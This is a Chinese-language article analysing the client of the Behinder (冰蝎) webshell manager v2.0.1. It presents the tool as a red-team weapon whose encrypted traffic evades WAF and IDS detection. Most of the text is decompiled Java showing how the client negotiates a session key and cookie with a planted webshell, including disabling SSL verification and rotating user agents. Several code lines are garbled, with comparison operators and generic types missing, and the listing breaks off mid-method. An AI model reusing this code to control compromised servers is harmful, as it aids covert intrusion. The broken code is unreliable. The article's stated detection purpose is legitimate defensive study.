# 0x01 为什么要分析冰蝎
冰蝎是一种新型的木马连接工具，具备强大的功能，只要将冰蝎码上传到服务器并能够成功访问，那就可以执行诸多实用的功能，包括获取服务器基本信息，执行系统命令，文件管理，数据库管理，反弹meterpreter，执行自定义代码等，功能强大。而且和同类型的菜刀，蚁剑相比，加密了流量，只要在上传冰蝎码时和密匙协商建立连接的时候流量分析设备不能够检测出来，那么连接成功建立之后，waf，ids，ips就会好难再检测到出来。所以，冰蝎绝对是目前渗透测试，红蓝对抗中红方的一大利器。对于红方而言，怎么更好地利用冰蝎，怎么绕过安全流量分析设备对冰蝎的检测，对于蓝方而言，怎么更好地检测和防御冰蝎，就成为了一个重要的话题。
# 0x02 开始
此次进行分析的是冰蝎v2.0.1版本的代码，从总体上看，冰蝎是先请求服务端，服务端判断请求之后生成一个128位的随机数，并将这个128位的随机数写入到session里面，并将这个128位的随机数返回给客户端，但是客户端并不会使用这个key作为之后的通讯的key，而是会继续重复上面过程，不断获取key，直到满足特定条件（下面的贴出代码）之后，才会确定是最终的key。客户端会保存这个key和响应报文里面的set-cookie的值。这个key就是之后客户端和服务端进行通讯的密匙。
获取key和保存cookie之后，获取服务端信息，执行命令，文件操作，数据库操作等都是使用这个key和cookie进行操作，对执行的代码动态生成class字节数组，然后使用key进行aes加密，再进行base64编码，并用post方式发送数据。接收服务端返回的数据时，先使用key进行解密，解密之后的数据一般是使用了base64编码，解码之后就可以获取服务端返回的明文数据。
# 0x03 协商密匙 getKeyAndCookie
客户端打开和服务端的连接之后，会先调用BasicInfoUtils类，在BasicInfoUtils类的getBasicInfo方法里，会调用ShellService的构造方法新建ShellService类。而在ShellService类里面的构造方法，会调用Utils的getKeyAndCookie方法。
    public static void getBasicInfo(final JSONObject shellEntity, final Browser baseInfoView, final Tree dirTree, final Text cmdview, final Label connectStatus, Text memoTxt, final Text imagePathTxt, Text msfTipsTxt, final Label statusLabel, final StyledText sourceCodeTxt, final Browser updateInfo, final Combo currentPathCombo, final Text sqlTxt) throws Exception {
        int uaIndex = (new Random()).nextInt(Constants.userAgents.length - 1);
        final String currentUserAgent = Constants.userAgents[uaIndex];
        final MainShell mainShell = (MainShell)dirTree.getShell();
        memoTxt.setText(shellEntity.getString("memo"));
        formatPayloadName(shellEntity.getString("type"), msfTipsTxt, "meterpreter");
        connectStatus.setText("Checking....");
        statusLabel.setText("正在获取基本信息……");
        (new Thread() {
            public void run() {
                try {
                    mainShell.currentShellService = new ShellService(shellEntity, currentUserAgent);
                    try {
                        if (mainShell.currentShellService.currentType.equals("php")) {
                            String content = UUID.randomUUID().toString();
                            JSONObject obj = mainShell.currentShellService.echo(content);
                            if (obj.getString("msg").equals(content)) {
                                mainShell.currentShellService.encryptType = Constants.ENCRYPT_TYPE_AES;
                            }
                        }
                    } catch (Exception var6) {
                        var6.printStackTrace();
                        mainShell.currentShellService.encryptType = Constants.ENCRYPT_TYPE_XOR;
                    }
下面来分析Utils.getKeyAndCookie方法：
放到服务端的木马里面会判断发送上来的请求是否带有pass参数，而在getKeyAndCookie里，password的值就是连接的时候的访问密码里的值，所以在连接的时候访问密码应该要填pass，否则响应报文会返回密匙获取失败，密码错误的错误信息.密匙获取成功的话，会返回一个128位的密匙，并保存在rawKey_1里面。
    public static Map getKeyAndCookie(String getUrl, String password, Map requestHeaders) throws Exception {
        disableSslVerification();
        Map result = new HashMap();
        StringBuffer sb = new StringBuffer();
        InputStreamReader isr = null;
        BufferedReader br = null;
        URL url;
        if (getUrl.indexOf("?") > 0) {
            url = new URL(getUrl + "&" + password + "=" + (new Random()).nextInt(1000));
        } else {
            url = new URL(getUrl + "?" + password + "=" + (new Random()).nextInt(1000));
        }
        HttpURLConnection.setFollowRedirects(false);
        Object urlConnection;
        String urlwithSession;
        String errorMsg;
        if (url.getProtocol().equals("https")) {
            if (Main.currentProxy != null) {
                urlConnection = (HttpsURLConnection)url.openConnection(Main.currentProxy);
                if (Main.proxyUserName != null && !Main.proxyUserName.equals("")) {
                    urlwithSession = "Proxy-Authorization";
                    errorMsg = "Basic " + Base64.encode((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
                    ((HttpURLConnection)urlConnection).setRequestProperty(urlwithSession, errorMsg);
                }
            } else {
                urlConnection = (HttpsURLConnection)url.openConnection();
            }
        } else if (Main.currentProxy != null) {
            urlConnection = (HttpURLConnection)url.openConnection(Main.currentProxy);
            if (Main.proxyUserName != null && !Main.proxyUserName.equals("")) {
                urlwithSession = "Proxy-Authorization";
                errorMsg = "Basic " + Base64.encode((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
                ((HttpURLConnection)urlConnection).setRequestProperty(urlwithSession, errorMsg);
            }
        } else {
            urlConnection = (HttpURLConnection)url.openConnection();
        }
        Iterator var23 = requestHeaders.keySet().iterator();
        while(var23.hasNext()) {
            urlwithSession = (String)var23.next();
            ((HttpURLConnection)urlConnection).setRequestProperty(urlwithSession, (String)requestHeaders.get(urlwithSession));
        }
        if (((HttpURLConnection)urlConnection).getResponseCode() == 302 || ((HttpURLConnection)urlConnection).getResponseCode() == 301) {
            urlwithSession = ((String)((List)((HttpURLConnection)urlConnection).getHeaderFields().get("Location")).get(0)).toString();
            if (!urlwithSession.startsWith("http")) {
                urlwithSession = url.getProtocol() + "://" + url.getHost() + ":" + (url.getPort() == -1 ? url.getDefaultPort() : url.getPort()) + urlwithSession;
                urlwithSession = urlwithSession.replaceAll(password + "=[0-9]*", "");
            }
            result.put("urlWithSession", urlwithSession);
        }
        boolean error = false;
        errorMsg = "";
        if (((HttpURLConnection)urlConnection).getResponseCode() == 500) {
            isr = new InputStreamReader(((HttpURLConnection)urlConnection).getErrorStream());
            error = true;
            errorMsg = "密钥获取失败,密码错误?";
        } else if (((HttpURLConnection)urlConnection).getResponseCode() == 404) {
            isr = new InputStreamReader(((HttpURLConnection)urlConnection).getErrorStream());
            error = true;
            errorMsg = "页面返回404错误";
        } else {
            isr = new InputStreamReader(((HttpURLConnection)urlConnection).getInputStream());
        }
        br = new BufferedReader(isr);
        String line;
        while((line = br.readLine()) != null) {
            sb.append(line);
        }
        br.close();
        if (error) {
            throw new Exception(errorMsg);
        } else {
            String rawKey_1 = sb.toString();
            String pattern = "[a-fA-F0-9]{16}";
            Pattern r = Pattern.compile(pattern);
            Matcher m = r.matcher(rawKey_1);
            if (!m.find()) {
                throw new Exception("页面存在，但是无法获取密钥!");
            } else {
                int start = 0;
                int end = 0;
                int cycleCount = 0;
                while(true) {
                    Map KeyAndCookie = getRawKey(getUrl, password, requestHeaders);
                    String rawKey_2 = (String)KeyAndCookie.get("key");
                    byte[] temp = CipherUtils.bytesXor(rawKey_1.getBytes(), rawKey_2.getBytes());
                    int i;
                    for(i = 0; i  0) {
                            if (start == 0 || i = 0; --i) {
                        if (temp[i] > 0) {
                            if (i >= end) {
                                end = i + 1;
                            }
                            break;
                        }
                    }
                    if (end - start == 16) {
                        result.put("cookie", (String)KeyAndCookie.get("cookie"));
                        result.put("beginIndex", String.valueOf(start));
                        result.put("endIndex", String.valueOf(temp.length - end));
                        String finalKey = new String(Arrays.copyOfRange(rawKey_2.getBytes(), start, end));
                        result.put("key", finalKey);
                        return result;
                    }
                    if (cycleCount > 10) {
                        throw new Exception("Can't figure out the key!");
                    }
                    ++cycleCount;
                }
            }
        }
    }
判断得到的密匙rawKey_1之后，进入循环调用getRawKey方法，并获取rawKey_2，并且将rawKey_1和rawKey_2进行异或操作。获取rawKey_2的方法和获取rawKey_1基本是一样的。
    public static Map getRawKey(String getUrl, String password, Map requestHeaders) throws Exception {
        Map result = new HashMap();
        StringBuffer sb = new StringBuffer();
        InputStreamReader isr = null;
        BufferedReader br = null;
        URL url;
        if (getUrl.indexOf("?") > 0) {
            url = new URL(getUrl + "&" + password + "=" + (new Random()).nextInt(1000));
        } else {
            url = new URL(getUrl + "?" + password + "=" + (new Random()).nextInt(1000));
        }
        HttpURLConnection.setFollowRedirects(false);
        Object urlConnection;
        String cookieValues;
        String headerValue;
        if (url.getProtocol().equals("https")) {
            if (Main.currentProxy != null) {
                urlConnection = (HttpsURLConnection)url.openConnection(Main.currentProxy);
                if (Main.proxyUserName != null && !Main.proxyUserName.equals("")) {
                    cookieValues = "Proxy-Authorization";
                    headerValue = "Basic " + Base64.encode((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
                    ((HttpURLConnection)urlConnection).setRequestProperty(cookieValues, headerValue);
                }
            } else {
                urlConnection = (HttpsURLConnection)url.openConnection();
            }
        } else if (Main.currentProxy != null) {
            urlConnection = (HttpURLConnection)url.openConnection(Main.currentProxy);
            if (Main.proxyUserName != null && !Main.proxyUserName.equals("")) {
                cookieValues = "Proxy-Authorization";
                headerValue = "Basic " + Base64.encode((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
                ((HttpURLConnection)urlConnection).setRequestProperty(cookieValues, headerValue);
            }
        } else {
            urlConnection = (HttpURLConnection)url.openConnection();
        }
        Iterator var15 = requestHeaders.keySet().iterator();
        while(var15.hasNext()) {
            cookieValues = (String)var15.next();
            ((HttpURLConnection)urlConnection).setRequestProperty(cookieValues, (String)requestHeaders.get(cookieValues));
        }
        cookieValues = "";
        Map> headers = ((HttpURLConnection)urlConnection).getHeaderFields();
        Iterator var12 = headers.keySet().iterator();
        String line;
        while(var12.hasNext()) {
            String headerName = (String)var12.next();
            if (headerName != null && headerName.equalsIgnoreCase("Set-Cookie")) {
                for(Iterator var14 = ((List)headers.get(headerName)).iterator(); var14.hasNext(); cookieValues = cookieValues + ";" + line) {
                    line = (String)var14.next();
                }
                cookieValues = cookieValues.startsWith(";") ? cookieValues.replaceFirst(";", "") : cookieValues;
                break;
            }
        }
        result.put("cookie", cookieValues);
        boolean error = false;
        String errorMsg = "";
        if (((HttpURLConnection)urlConnection).getResponseCode() == 500) {
            isr = new InputStreamReader(((HttpURLConnection)urlConnection).getErrorStream());
            error = true;
            errorMsg = "密钥获取失败,密码错误?";
        } else if (((HttpURLConnection)urlConnection).getResponseCode() == 404) {
            isr = new InputStreamReader(((HttpURLConnection)urlConnection).getErrorStream());
            error = true;
            errorMsg = "页面返回404错误";
        } else {
            isr = new InputStreamReader(((HttpURLConnection)urlConnection).getInputStream());
        }
        br = new BufferedReader(isr);
        while((line = br.readLine()) != null) {
            sb.append(line);
        }
        br.close();
        if (error) {
            throw new Exception(errorMsg);
        } else {
            result.put("key", sb.toString());